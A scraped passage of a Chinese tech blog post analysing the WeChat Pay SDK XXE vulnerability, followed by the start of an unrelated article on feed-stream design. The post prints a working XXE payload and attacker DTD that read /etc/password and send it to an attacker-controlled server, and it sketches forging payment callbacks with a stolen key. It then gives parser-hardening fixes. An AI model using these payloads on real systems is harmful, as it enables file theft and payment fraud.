class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d89781d02d181565726-1\"><span class=\"crayon-ta\">&lt;?</span><span class=\"crayon-e\">xml </span><span class=\"crayon-i\">version</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"1.0\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">encoding</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"utf-8\"</span><span class=\"crayon-ta\">?&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d89781d02d181565726-2\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">!</span><span class=\"crayon-e\">DOCTYPE </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span></div><div class=\"crayon-line\" id=\"crayon-5b4d89781d02d181565726-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">ENTITY</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">file </span><span class=\"crayon-i\">SYSTEM</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"file:///etc/password\"</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d89781d02d181565726-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">ENTITY</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">xxe </span><span class=\"crayon-i\">SYSTEM</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"http://127.0.0.1:9000/xxe.dtd\"</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d89781d02d181565726-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">xxe</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d89781d02d181565726-6\"><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0038 seconds] -->\r\n<p>其中/etc/password为要窃取的对象，http://127.0.0.1:9000/xxe.dtd为攻击者服务器中的dtd文件，内容如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d89781d039764112691\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n&lt;!ENTITY % shell \"&lt;!ENTITY % upload SYSTEM 'http://127.0.0.1:9000/evil/%file;'&gt;\"&gt;\r\n%shell;\r\n%upload;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d89781d039764112691-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d89781d039764112691-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d89781d039764112691-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d89781d039764112691-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d89781d039764112691-1\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">ENTITY</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">shell</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"&lt;!ENTITY % upload SYSTEM 'http://127.0.0.1:9000/evil/%file;'&gt;\"</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d89781d039764112691-2\"><span class=\"crayon-ta\">%</span><span class=\"crayon-v\">shell</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d89781d039764112691-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d89781d039764112691-4\"><span class=\"crayon-o\">%</span><span class=\"crayon-v\">upload</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0029 seconds] -->\r\n<p>通过xml+dtd文件，攻击者便可以在服务器http://127.0.0.1:9000中收到如下请求：</p>\n<p>http://127.0.0.1:9000/evil/password1234</p>\n<p>这样，攻击者便得到了/etc/password文件的内容。</p>\n<p>在本例中，攻击者窃取了/etc/password文件中的内容，实际上攻击者还可以获取服务器中的目录结构以及其他文件，只要启动web应用的用户具有相应的读权限。如果获取的信息比较复杂，如包含特殊符号，无法直接通过http的URL发送，则可以采用对文件内容进行Base64编码等方法解决。</p>\n<h1>三、漏洞的解决</h1>\n<p>解决该漏洞的原理非常简单，只要禁止解析XML时访问外部实体即可。</p>\n<p>漏洞曝出以后，微信进行了紧急修复，一方面是更新了SDK，并提醒开发者使用最新的SDK；SDK中修复代码如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/4216f33b379b06b889d166d080606b0a.png\" alt=\"\"></p>\n<p>加入了如下两行代码：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d89781d03e111185241\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndocumentBuilderFactory.setExpandEntityReferences(false);\r\ndocumentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d89781d03e111185241-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d89781d03e111185241-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d89781d03e111185241-1\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setExpandEntityReferences</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d89781d03e111185241-2\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">XMLConstants</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">FEATURE_SECURE_PROCESSING</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n\n</div>\n<p>更新：微信表示上述2条语句无法禁止该漏洞，又双叒叕更新了官方SDK，加了以下语句（对于微信的这波操作，不知如何评价）：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d89781d047903210913\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndocumentBuilderFactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\r\ndocumentBuilderFactory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\r\ndocumentBuilderFactory.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\r\ndocumentBuilderFactory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\r\ndocumentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\r\ndocumentBuilderFactory.setXIncludeAware(false);\r\ndocumentBuilderFactory.setExpandEntityReferences(false);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d89781d047903210913-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d89781d047903210913-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d89781d047903210913-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d89781d047903210913-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4d89781d047903210913-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d89781d047903210913-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4d89781d047903210913-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d89781d047903210913-1\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://apache.org/xml/features/disallow-doctype-decl\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d89781d047903210913-2\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://xml.org/sax/features/external-general-entities\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d89781d047903210913-3\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://xml.org/sax/features/external-parameter-entities\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d89781d047903210913-4\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://apache.org/xml/features/nonvalidating/load-external-dtd\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d89781d047903210913-5\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">XMLConstants</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">FEATURE_SECURE_PROCESSING</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d89781d047903210913-6\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setXIncludeAware</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d89781d047903210913-7\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setExpandEntityReferences</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n\n</div>\n<p>此外，微信官方也给出了关于XXE漏洞的最佳安全实践，可以参考：</p>\n<p><a href=\"https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5\">https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5</a></p>\n<p>笔者本人使用上述方案中建议的如下代码修复了该漏洞：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d89781d04b929966233\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nDocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance();\r\ndocumentBuilderFactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\r\nDocumentBuilder documentBuilder = documentBuilderFactory.newDocumentBuilder();\r\n……</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d89781d04b929966233-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d89781d04b929966233-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d89781d04b929966233-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d89781d04b929966233-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d89781d04b929966233-1\"><span class=\"crayon-e\">DocumentBuilderFactory </span><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">DocumentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">newInstance</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d89781d04b929966233-2\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://apache.org/xml/features/disallow-doctype-decl\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d89781d04b929966233-3\"><span class=\"crayon-e\">DocumentBuilder </span><span class=\"crayon-v\">documentBuilder</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">newDocumentBuilder</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d89781d04b929966233-4\">……</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n\n</div>\n<h1>四、扩展与反思</h1>\n<h2>1.  危害不只是“0元也能买买买”</h2>\n<p>在很多媒体的报道中，强调该漏洞的风险在于攻击者可以不支付也可以获得商品。确实，攻击者在通过上述漏洞获得微信支付的秘钥以后，有不止一种途径可以做到不支付就获得商品：例如，攻击者首先在系统中下单，获得商户订单号；然后便可以调用微信支付的异步回调，其中的签名参数便可以使用前面获取的秘钥对订单号等信息进行MD5获得；这样攻击者的异步回调就可以通过应用服务器的签名认证，从而获得商品。不过，在很多有一定规模的购物网站（或其他有支付功能的网站），会有对账系统，如定时将系统中的订单状态与微信、支付宝的后台对比，如果出现不一致可以及时报警并处理，因此该漏洞在这方面的影响可能并没有想象的那么大。</p>\n<p>然而，除了“0元也能买买买”，攻击者可以做的事情还有很多很多；理论上来说，攻击者可能获得应用服务器上的目录结构、代码、数据、配置文件等，可以根据需要进行进一步破坏。</p>\n<h2>2.  漏洞不限于微信支付SDK</h2>\n<p>虽然微信支付曝出该漏洞受到了广泛关注，但该漏洞绝不仅仅存在于微信支付中：由于众多XML解析器默认不会禁用对外部实体的访问，因此应用的接口如果有以下几个特点就很容易掉进XXE漏洞的坑里：</p>\n<p>（1）接口使用xml做请求参数</p>\n<p>（2）接口对外公开，或容易获得：例如一些接口提供给外部客户调用，或者接口使用http很容易抓包，或者接口比较容易猜到(如微信支付的异步回调接口)</p>\n<p>（3）接口中解析xml参数时，没有禁用对外部实体的访问</p>\n<p>建议大家最好检查一下自己的应用中是否有类似的漏洞，及时修复。</p>\n<h2>3.  xml与json</h2>\n<p>xml 与 json是系统间交互常用的两种数据格式，虽然很多情况下二者可以互换，但是笔者认为，json 作为更加轻量级更加纯粹的数据格式，更适合于系统间的交互；而xml，作为更加重量级更加复杂的数据格式，其 DTD 支持自定义文档类型，在更加复杂的配置场景下有着更好的效果，典型的场景如 spring 相关的配置。</p>\n<h2>4.  题外话：微信支付的签名认证</h2>\n<p>在前面曾经提到，应用中存储的秘钥一旦泄露，攻击者便可以完全绕过签名认证，这是因为微信支付使用的是对称式的签名认证：微信方和应用方，使用相同的秘钥对相同的明文进行MD5签名，只要应用方的秘钥泄露，签名认证就完全成了摆设。</p>\n<p>在这方面支付宝的做法更规范也更安全：支付宝为应用生成公私钥对，公钥由应用方保存，私钥由支付宝保存；在回调时，支付宝使用私钥进行签名，应用方使用公钥进行验证；这样只要支付宝保存的私钥不泄露，攻击者只有公钥则难以通过签名认证。</p>\n<h1>参考文献</h1>\n<p>https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5</p>\n<p><a href=\"http://seclists.org/fulldisclosure/2018/Jul/3\">http://seclists.org/fulldisclosure/2018/Jul/3</a></p>\n<p>https://www.cnblogs.com/tongwen/p/5194483.html</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114197\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114197votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114197\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>"], "tags": "IT技术,安全", "author": "编程迷思", "front_image_path": "full/9a51fcef743ae4aca8b8c39bcc18e02a01782e9c.jpg"}
{"title": "关于 Feed 流的几个热门问题", "createdate": "2018/07/09", "url": "http://blog.jobbole.com/114156/", "url_object_id": "7b4b289d21745010a22e3afbfc59d82c", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2011/11/software-development-logo.jpg"], "thumbs": 1, "bookmark": 1, "comments": null, "contents": ["<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/vincent7\">v7</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><div>\n<h2><b>0x00 前言</b></h2>\n<p>本篇聊一下 Feed 流技术，由于这个话题在业界有丰富的实践经验，所以我特意选了个小的切入点，从相对微观的角度说几个具体的问题，避免一些无意义的重复。希望提炼实践中的具体问题来做讨论，使事情变得更有实际意义。</p>\n<h2><b>0x01 先行资料</b></h2>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/20690652\">什么是 Feed 流</a></li>\n<li><a href=\"https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/NFH8XVXpprMHOEEAovND2A\" target=\"_blank\" rel=\"nofollow noreferrer\">如何设计 Twitter 这样的系统架构</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/30226315\">如何打造千万级Feed流系统</a></li>\n</ul>\n<h2><b>0x02 关于模型</b></h2>\n<p>当要做一个 Feed 流，摆在我们眼前的第一个问题就是到底选推模型还是选拉模型，因为这个选择将影响接下来一系列的架构方式。</p>\n<ul>\n<li><b>推模型 or 拉模型</b></li>\n</ul>\n<p>推模型和拉模型各自的优缺点已经被罗列了很多了，比如推模型的存储量大，或者拉模型的效率可能低，但如果你从无到有做这个事情，这些优缺点的罗列还是无法帮助你做出最初的决定，所谓的“知道了许多道理，还是过不好这一生”，当然除非你有实际的构造大流量 Feed 流的经验。</p>\n<p>然而根据我们的经验：基于正确规范的架构和基础设施，对于一个千万日活量级的应用 Feed 